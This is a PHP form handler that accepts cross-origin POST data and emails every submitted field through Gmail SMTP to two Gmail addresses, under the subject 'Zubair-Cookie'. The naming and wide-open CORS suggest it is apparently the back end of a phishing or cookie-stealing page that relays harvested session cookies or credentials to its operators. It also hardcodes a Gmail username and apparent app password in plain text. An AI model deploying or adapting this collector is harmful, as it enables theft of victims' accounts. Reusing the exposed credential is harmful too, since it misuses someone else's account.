<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// ==== CORS HEADERS ====
header("Access-Control-Allow-Origin: *"); // Or specify origin
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// ==== Handle Preflight (OPTIONS) Request ====
if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
    http_response_code(200);
    exit();
}

// ==== Continue with form handling ====

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $emailBody = '';

    foreach ($_POST as $key => $value) {
        $emailBody .= ucfirst($key) . ': ' . htmlspecialchars($value) . '<br>';
    }

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'dardhame1@gmail.com';
        $mail->Password   = 'vbbx qrsx uvpo plzl';
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        $mail->setFrom('dardhame1@gmail.com', 'PROFESSOR');
        $mail->addAddress('submitdispute@gmail.com');
        $mail->addAddress('newzatpage@gmail.com');

        $mail->isHTML(true);
        $mail->Subject = 'Zubair-Cookie';
        $mail->Body = $emailBody;

        $mail->send();

        // Optional: send a JSON response instead of redirecting
        echo json_encode(['status' => 'success', 'message' => 'Email sent']);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $mail->ErrorInfo]);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
